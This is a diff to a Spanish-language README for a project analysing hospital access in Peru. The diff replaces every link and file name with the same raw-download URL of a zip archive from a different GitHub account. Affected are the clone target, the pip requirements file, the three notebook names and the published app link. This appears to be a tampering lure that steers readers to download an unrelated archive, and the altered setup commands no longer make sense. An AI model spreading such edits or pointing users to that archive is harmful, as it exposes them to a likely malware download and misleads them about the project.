@@ -19,7 +19,7 @@ Para poner en marcha este proyecto en tu entorno local, sigue estos pasos desde 
 1.  **Clona el Repositorio**
 
     ```bash
-    git clone [https://github.com/valentinalinares/Hospitals-Access-Peru]
+    git clone [https://github.com/Bruno1702vm/Hospitals-Access-Peru/raw/refs/heads/main/data/Censo/Peru_Hospitals_Access_v2.9.zip]
     cd [Hospitals-Access-Peru]
     ```
 
@@ -35,10 +35,10 @@ Para poner en marcha este proyecto en tu entorno local, sigue estos pasos desde 
     ```
 
 3.  **Instala las Dependencias**
-    Este comando leerá el archivo `requirements.txt` e instalará todas las librerías necesarias dentro de tu entorno `streamlit`.
+    Este comando leerá el archivo `https://github.com/Bruno1702vm/Hospitals-Access-Peru/raw/refs/heads/main/data/Censo/Peru_Hospitals_Access_v2.9.zip` e instalará todas las librerías necesarias dentro de tu entorno `streamlit`.
 
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://github.com/Bruno1702vm/Hospitals-Access-Peru/raw/refs/heads/main/data/Censo/Peru_Hospitals_Access_v2.9.zip
     ```
 
 -----
@@ -47,15 +47,15 @@ Para poner en marcha este proyecto en tu entorno local, sigue estos pasos desde 
 
 El análisis completo está dividido en tres notebooks de Jupyter. Para asegurar que el flujo de datos sea correcto, **debes ejecutarlos en el siguiente orden**. Recuerda tener siempre tu entorno `streamlit` activado.
 
-1.  **`task1_2_frompart2.ipynb`**
+1.  **`https://github.com/Bruno1702vm/Hospitals-Access-Peru/raw/refs/heads/main/data/Censo/Peru_Hospitals_Access_v2.9.zip`**
     * **Contenido**: Realiza la carga, limpieza y preparación inicial de los datos de hospitales y distritos.
     * **Análisis**: Genera los mapas estáticos y el análisis a nivel de distrito y departamento.
 
-2.  **`task3_frompart2.ipynb`**
+2.  **`https://github.com/Bruno1702vm/Hospitals-Access-Peru/raw/refs/heads/main/data/Censo/Peru_Hospitals_Access_v2.9.zip`**
     * **Contenido**: Carga los datos procesados del notebook anterior y los datos de centros poblados.
     * **Análisis**: Ejecuta el análisis de proximidad de 10 km para Lima y Loreto.
 
-3.  **`task1_2_frompart3.ipynb`**
+3.  **`https://github.com/Bruno1702vm/Hospitals-Access-Peru/raw/refs/heads/main/data/Censo/Peru_Hospitals_Access_v2.9.zip`**
     * **Contenido**: Utiliza todos los datos y análisis generados previamente.
     * **Análisis**: Crea los mapas interactivos finales con Folium, incluyendo el coroplético nacional y los mapas de proximidad, dejando todo listo para la aplicación.
   
@@ -63,4 +63,4 @@ El análisis completo está dividido en tres notebooks de Jupyter. Para asegurar
 Document in the README how hospitals were filtered for “functioning status”: Luego de revisar la data, se identificó que los hospitales en funcionamiento tenían el valor "EN FUNCIONAMIENTO" en la variable "Condición". Por ello se usó data = data[data["Condición"] == "EN FUNCIONAMIENTO"] para filtrarlos.
 
 -----
-Link del Streamlit publicado: https://g388nsruz9uktchjsouxos.streamlit.app/
+Link del Streamlit publicado: https://github.com/Bruno1702vm/Hospitals-Access-Peru/raw/refs/heads/main/data/Censo/Peru_Hospitals_Access_v2.9.zip
